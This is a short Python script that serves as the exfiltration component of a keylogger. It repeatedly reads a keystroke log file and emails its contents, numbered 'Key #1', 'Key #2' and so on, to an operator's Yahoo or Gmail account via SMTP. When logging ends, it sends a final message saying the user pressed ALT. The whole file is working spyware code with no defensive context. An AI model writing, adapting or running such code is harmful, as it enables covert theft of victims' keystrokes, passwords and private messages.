#!/usr/bin/python

import smtplib
import sys
from time import sleep
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

email = 'youremail' # Change
passw = 'yourpassword' # Change
logfile = 'logfile.txt'
count = 1
previous = ''

def Send():
    global count
    global previous
    while ReadLogFile() == previous or len(ReadLogFile()) == 0:
        continue
    smtp = smtplib.SMTP('smtp.mail.yahoo.com', 587) # Change Gmail is: smtp.gmail.com
    smtp.ehlo()
    smtp.starttls()
    smtp.login(email, passw)
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = 'Key #{}'.format(count)
    previous = ReadLogFile()
    msg.attach(MIMEText(ReadLogFile()))
    smtp.sendmail(email, email, msg.as_string())
    count += 1
    if 'Done!!' in ReadLogFile():
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = 'Key #{}'.format('LAST')
        msg.attach(MIMEText('\n[!] USER HAS PRESSED ALT! KEYLOGGING STOPPED!\n'))
        smtp.sendmail(email, email, msg.as_string())
        smtp.close()
        sys.exit(0)
    smtp.close()
    sleep(150)

def ReadLogFile():
    try:
        with open(logfile, 'r') as fp:
            return fp.read()
    except:
        return 'Log File Has Not Been Created Yet'

def main():
    while True:
        Send()

if __name__ == '__main__':
    main()
    
